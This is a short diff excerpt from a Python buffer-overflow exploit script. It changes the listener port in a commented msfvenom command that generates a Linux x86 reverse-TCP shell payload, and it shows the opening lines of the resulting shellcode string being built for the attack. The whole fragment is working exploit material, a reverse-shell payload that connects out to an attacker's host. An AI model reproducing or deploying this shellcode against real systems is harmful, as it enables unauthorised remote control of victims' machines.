@@ -25,7 +25,7 @@ def BufferOverflow():
     print(s.recv(1024))
     print("exploiting...." + "\n")
 
-    #sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=443  -f py -b "\x00"
+    #sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=6989  -f py -b "\x00"
     buf = "\xdb\xc2\xba\xa3\x42\x59\x20\xd9\x74\x24\xf4\x5e\x29"
     buf += "\xc9\xb1\x12\x31\x56\x17\x03\x56\x17\x83\x4d\xbe\xbb"
     buf += "\xd5\xa0\xe4\xcb\xf5\x91\x59\x67\x90\x17\xd7\x66\xd4"
